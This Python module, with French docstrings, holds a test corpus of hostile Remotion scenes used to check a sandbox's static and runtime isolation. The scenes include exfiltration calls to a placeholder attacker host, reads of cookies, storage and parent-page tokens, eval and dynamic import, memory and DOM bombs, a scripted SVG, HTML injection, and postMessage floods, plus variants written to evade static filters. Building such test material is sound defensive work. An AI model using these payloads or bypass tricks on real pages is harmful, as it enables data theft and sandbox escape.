"""Corpus de scènes Remotion HOSTILES (Slice 06 de jarvis-remotion-presentation-integration).

Chaque échantillon existe en deux versions :

- `direct` : écrit à la main, sans effort de dissimulation. La couche statique (`jarvis.domain.remotion_isolation`) doit le refuser
  à la publication, avec le code de règle attendu (`STATIC_CODES`) ;
- `evasive` : même attaque, écrite pour **passer** la couche statique (accès par `(self as any)["nom"]`, chaînes composées,
  `for` borné par une variable...). Elle est publiée, compilée par le vrai compilateur et chargée dans le bac à sable : la couche
  d'exécution (iframe `sandbox`, origine dédiée, CSP, protocole, chien de garde) doit la neutraliser seule.

Le corpus est consommé par `tests/unit/test_remotion_isolation.py` (couche statique) et `scripts/remotion_isolation_harness.py`
(couche d'exécution, Chrome réel). Une scène hostile ne contient aucune adresse réelle : `__ATTACKER__` est remplacé par le puits
d'exfiltration local du harnais, `__ID__` par l'identifiant de l'échantillon (les requêtes qu'il reçoit sont ainsi attribuables).
"""

from __future__ import annotations

from dataclasses import dataclass, field

HEADER = '''import React from "react";
import {AbsoluteFill, Img, staticFile} from "remotion";
const ATTACKER = "__ATTACKER__/__ID__";
'''

PRELUDE_DIRECT = '''function report(id: string, v: unknown) { window.parent.postMessage({probe: id, v: String(v).slice(0, 160)}, "*"); }
async function attempt(id: string, fn: () => unknown) {
  try { const r = await fn(); report(id, "returned:" + String(r)); } catch (e: any) { report(id, "blocked:" + (e && e.name)); }
}
'''
PRELUDE_EVASIVE = '''const G: any = (self as any);
function report(id: string, v: unknown) { G["parent"]["postMessage"]({probe: id, v: String(v).slice(0, 160)}, "*"); }
async function attempt(id: string, fn: () => unknown) {
  try { const r = await fn(); report(id, "returned:" + String(r)); } catch (e: any) { report(id, "blocked:" + (e && e.name)); }
}
'''
FOOTER = '''export default function Scene(props: {title?: string}) {
  return (
    <AbsoluteFill id="scene" style={{background: "#101820"}}>
      <h1 id="title" style={{color: "#fff"}}>{props.title ?? "HOSTILE-__ID__"}</h1>__EXTRA__
    </AbsoluteFill>
  );
}
'''


@dataclass(frozen=True)
class Hostile:
    """`attempts` : `(sonde, expression directe, expression évasive)` ; `body_*` : code de plus haut niveau (boucles, spam)."""

    id: str
    summary: str
    #: Code de règle statique que la version `direct` doit déclencher.
    static_codes: tuple[str, ...]
    attempts: tuple[tuple[str, str, str], ...] = ()
    body_direct: str = ""
    body_evasive: str = ""
    extra_jsx: str = ""
    assets: dict[str, bytes] = field(default_factory=dict)
    #: Ce que l'hôte doit constater en fin d'épreuve : `killed` (raison), `alive`, `crashed`.
    runtime: str = "alive"
    #: Durée d'observation de l'harnais (ms).
    wait_ms: int = 5000

    def source(self, flavor: str, attacker_id: str | None = None) -> dict[str, str | bytes]:
        """Fichiers de la scène. `attacker_id` : segment d'URL du puits d'exfiltration (par défaut l'id de l'échantillon) ; le
        harnais en donne un propre à chaque épreuve pour attribuer chaque requête reçue."""

        direct = flavor == "direct"
        ident = attacker_id or self.id
        lines = [HEADER.replace("__ID__", ident), PRELUDE_DIRECT if direct else PRELUDE_EVASIVE]
        for probe, expr_direct, expr_evasive in self.attempts:
            lines.append(f'void attempt("{probe}", () => {expr_direct if direct else expr_evasive});')
        lines.append(self.body_direct if direct else self.body_evasive)
        lines.append(FOOTER.replace("__EXTRA__", self.extra_jsx).replace("__ID__", self.id))
        files: dict[str, str | bytes] = {"src/Scene.tsx": "\n".join(lines)}
        files.update({path: data.replace(b"/svg_script", f"/{ident}".encode()) if path.endswith(".svg") else data
                      for path, data in self.assets.items()})
        return files


def _svg(attacker: str = "__ATTACKER__/svg_script") -> bytes:
    return ('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="40" '
            f'onload="fetch(\'{attacker}/onload\')"><script>fetch(\'{attacker}/script\');document.title=\'PWNED\'</script>'
            f'<rect width="40" height="40" fill="red"/><image xlink:href="{attacker}/image.png" width="10" height="10"/>'
            f'<foreignObject width="40" height="40"><iframe xmlns="http://www.w3.org/1999/xhtml" src="{attacker}/frame"></iframe>'
            '</foreignObject></svg>').encode("utf-8")


SAMPLES: tuple[Hostile, ...] = (
    Hostile("net_exfil", "fetch / XHR / WebSocket / sendBeacon / Image toward a foreign origin", ("network_api",), (
        ("fetch", 'fetch(ATTACKER + "/fetch")', 'G["fetch"](ATTACKER + "/fetch")'),
        ("xhr", 'new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open("GET", ATTACKER + "/xhr"); '
                'x.onerror = () => rej(new Error("xhr network error")); x.onload = () => res("loaded"); x.send(); })',
                'new Promise((res, rej) => { const x = new G["XMLHttpRequest"](); x["open"]("GET", ATTACKER + "/xhr"); '
                'x.onerror = () => rej(new Error("xhr network error")); x.onload = () => res("loaded"); x["send"](); })'),
        ("websocket", 'new WebSocket(ATTACKER.replace("http", "ws") + "/ws")', 'new G["WebSocket"](ATTACKER.replace("http", "ws") + "/ws")'),
        ("beacon", 'navigator.sendBeacon(ATTACKER + "/beacon", "x")', 'G["navigator"]["sendBeacon"](ATTACKER + "/beacon", "x")'),
        ("image", 'new Promise((res, rej) => { const i = new Image(); i.onload = () => res("loaded"); i.onerror = () => rej(new Error("image blocked")); i.src = ATTACKER + "/img"; })',
                  'new Promise((res, rej) => { const i = new Image(); i.onload = () => res("loaded"); i.onerror = () => rej(new Error("image blocked")); i.src = ATTACKER + "/img"; })'),
        ("css_url", 'new Promise((res) => { const d = document.createElement("div"); d.style.backgroundImage = "url(" + ATTACKER + "/css)"; document.body.appendChild(d); res("appended"); })',
                    'new Promise((res) => { const d = G["document"]["createElement"]("div"); d.style.backgroundImage = "url(" + ATTACKER + "/css)"; G["document"].body.appendChild(d); res("appended"); })'),
    )),
    Hostile("storage_read", "localStorage / sessionStorage / cookie / indexedDB of the host page", ("realm_access",), (
        ("localstorage", 'localStorage.getItem("jarvis_secret")', 'G["localStorage"]["getItem"]("jarvis_secret")'),
        ("sessionstorage", 'sessionStorage.getItem("jarvis_secret")', 'G["sessionStorage"]["getItem"]("jarvis_secret")'),
        ("cookie", 'document.cookie', 'G["document"]["cookie"]'),
        ("indexeddb", 'indexedDB.open("jarvis")', 'G["indexedDB"]["open"]("jarvis")'),
    )),
    Hostile("parent_access", "parent / top / opener reach into the embedding page", ("realm_access",), (
        ("parent_document", 'window.parent.document.cookie', 'G["parent"]["document"]["cookie"]'),
        ("parent_storage", 'window.parent.localStorage.getItem("jarvis_secret")', 'G["parent"]["localStorage"]["getItem"]("jarvis_secret")'),
        ("top_global", 'window.top.JARVIS_TOKEN', 'G["top"]["JARVIS_TOKEN"]'),
        ("parent_location", 'window.parent.location.href', 'G["parent"]["location"]["href"]'),
        ("opener", 'window.opener', 'G["opener"]'),
    )),
    Hostile("window_nav", "window.open, top navigation, self navigation, parent navigation", ("realm_access",), (
        ("open", 'window.open(ATTACKER + "/open", "_blank")', 'G["open"](ATTACKER + "/open", "_blank")'),
        ("top_nav", '(window.top.location.href = ATTACKER + "/top")', '(G["top"]["location"]["href"] = ATTACKER + "/top")'),
        ("parent_nav", 'window.parent.location.replace(ATTACKER + "/parent")', 'G["parent"]["location"]["replace"](ATTACKER + "/parent")'),
        ("self_nav", '(window.location.href = ATTACKER + "/self")', '(G["location"]["href"] = ATTACKER + "/self")'),
    ), wait_ms=4000),
    Hostile("code_exec", "eval / Function / string timer / dynamic import / Worker", ("code_execution",), (
        ("eval", 'eval("1+1")', 'G["eval"]("1+1")'),
        ("function", 'new Function("return 1")()', 'new G["Function"]("return 1")()'),
        ("string_timer", 'setTimeout("1", 0)', 'G["setTimeout"]("1", 0)'),
        ("dynamic_import", 'import("data:text/javascript,export default 1")', 'new G["Function"]("return im" + "port(\'data:text/javascript,export default 1\')")()'),
        ("worker", 'new Worker(URL.createObjectURL(new Blob(["1"])))', 'new G["Worker"](G["URL"]["createObjectURL"](new Blob(["1"])))'),
    )),
    Hostile("infinite_loop", "a synchronous infinite loop at load", ("unbounded_loop",),
            body_direct="while (true) { /* spin */ }",
            body_evasive="let spin = 0; for (let i = 0; i < 1; ) { spin += 0; }",
            runtime="killed:unresponsive", wait_ms=9000),
    Hostile("memory_bomb", "allocates 60 x 4 MB of doubles (240 MB, bounded) against a 128 MB renderer heap limit, then spins", ("unbounded_loop",),
            body_direct="const keep: number[][] = []; while (true) { if (keep.length >= 60) { break; } keep.push(new Array(500000).fill(1.5)); } "
                        "let s3 = 0; for (let j = 0; j < 1; ) { s3 += 0; }",
            body_evasive="const keep: number[][] = []; for (let i = 0; i < 60; i++) { keep.push(new Array(500000).fill(1.5)); } "
                         "let s3 = 0; for (let j = 0; j < 1; ) { s3 += 0; } (self as any)[\"__keep\"] = keep;",
            runtime="killed:unresponsive", wait_ms=9000),
    Hostile("memory_creep", "allocates 8 MB every 50 ms while staying responsive (bounded at 400 MB): only the heap report can stop it", ("realm_access",),
            body_direct="const creep: number[][] = []; const tick = window.setInterval(() => { if (creep.length >= 50) { window.clearInterval(tick); return; } "
                        "creep.push(new Array(1000000).fill(1.5)); }, 50);",
            body_evasive="const creep: number[][] = []; const tick = G[\"setInterval\"](() => { if (creep.length >= 50) { G[\"clearInterval\"](tick); return; } "
                         "creep.push(new Array(1000000).fill(1.5)); }, 50);",
            runtime="killed:memory", wait_ms=9000),
    Hostile("dom_bomb", "appends a million DOM nodes then spins", ("realm_access",),
            body_direct="for (let i = 0; i < 1000000; i++) { document.body.appendChild(document.createElement(\"div\")); } let s = 0; for (let j = 0; j < 1; ) { s += 0; }",
            body_evasive="for (let i = 0; i < 1000000; i++) { G[\"document\"][\"body\"][\"appendChild\"](G[\"document\"][\"createElement\"](\"div\")); } let s = 0; for (let j = 0; j < 1; ) { s += 0; }",
            runtime="killed:unresponsive", wait_ms=9000),
    Hostile("svg_script", "an SVG asset with script, onload, external image and foreignObject iframe", ("svg_script",),
            extra_jsx='<Img id="evil" src={staticFile("evil.svg")} style={{width: 40, height: 40}} />',
            assets={"public/evil.svg": _svg()}),
    Hostile("inline_injection", "dangerouslySetInnerHTML with onerror / onload / script", ("inline_handler_string",),
            extra_jsx='<div id="inj" dangerouslySetInnerHTML={{__html: INJECTED}} />',
            body_direct="const INJECTED = '<img src=\"x\" onerror=\"fetch(\'' + ATTACKER + '/inline-onerror\')\"><svg onload=\"fetch(\'' + ATTACKER + '/inline-svg\')\"></svg><script>fetch(\'' + ATTACKER + '/inline-script\')</script>';",
            body_evasive="const F = \"fe\" + \"tch\"; const INJECTED = '<img src=\"x\" o' + 'nerror=\"' + F + '(\'' + ATTACKER + '/inline-onerror\')\"><svg o' + 'nload=\"' + F + '(\'' + ATTACKER + '/inline-svg\')\"></svg><scr' + 'ipt>' + F + '(\'' + ATTACKER + '/inline-script\')</scr' + 'ipt>';"),
    Hostile("postmessage_spoof", "forged, oversized, malformed and flooding messages toward the host", ("realm_access", "worker_or_channel"),
            body_direct='''const forged: unknown[] = [
  {rs: 1, type: "init", composition: {}, props: {}}, {rs: 1, type: "pong", n: "aaaaaaaa", frame: 0, dropped: 0},
  {rs: 1, type: "error", message: "x".repeat(1000000)}, "plain string", null, 42, {rs: 2, type: "ready"}, {rs: 1, type: "ready"},
  {rs: 1, type: "violation", directive: "x y", blocked: ""}, {rs: 1, type: "error", message: "m", extra: true},
  JSON.parse('{"rs":1,"type":"error","message":"m","__proto__":{"admin":true}}')];
for (let k = 0; k < 40; k++) { for (const m of forged) { window.parent.postMessage(m, "*"); } }
for (let k = 0; k < 3000; k++) { window.parent.postMessage({rs: 1, type: "error", message: "flood " + k}, "*"); }''',
            body_evasive='''const forged: unknown[] = [
  {rs: 1, type: "init", composition: {}, props: {}}, {rs: 1, type: "pong", n: "aaaaaaaa", frame: 0, dropped: 0},
  {rs: 1, type: "error", message: "x".repeat(1000000)}, "plain string", null, 42, {rs: 2, type: "ready"}, {rs: 1, type: "ready"},
  {rs: 1, type: "violation", directive: "x y", blocked: ""}, {rs: 1, type: "error", message: "m", extra: true},
  JSON.parse('{"rs":1,"type":"error","message":"m","__proto__":{"admin":true}}')];
for (let k = 0; k < 40; k++) { for (const m of forged) { G["parent"]["postMessage"](m, "*"); } }
for (let k = 0; k < 3000; k++) { G["parent"]["postMessage"]({rs: 1, type: "error", message: "flood " + k}, "*"); }''',
            runtime="killed:protocol_abuse", wait_ms=5000),
)

BY_ID = {sample.id: sample for sample in SAMPLES}
